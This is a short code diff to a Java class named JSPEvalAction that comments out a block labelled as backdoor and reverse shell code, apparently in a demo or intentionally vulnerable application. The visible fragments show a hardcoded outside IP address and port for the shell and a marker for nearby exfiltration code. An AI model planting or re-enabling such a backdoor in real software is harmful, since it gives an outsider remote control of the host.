@@ -58,7 +58,7 @@ public class JSPEvalAction extends ExampleAction {
 				// end exfil code
 
 				// begin backdoor/reverse shell code
-
+				/*
 				try {
 		                   String host = "39.234.101.45";
 		                   int port = 9999;
@@ -93,7 +93,7 @@ public class JSPEvalAction extends ExampleAction {
 		                   s.close();
 				}
 				catch (Throwable t) {}
-				
+				*/
 				// end backdoor/reverse shell code
 				
 				if (writer != null)
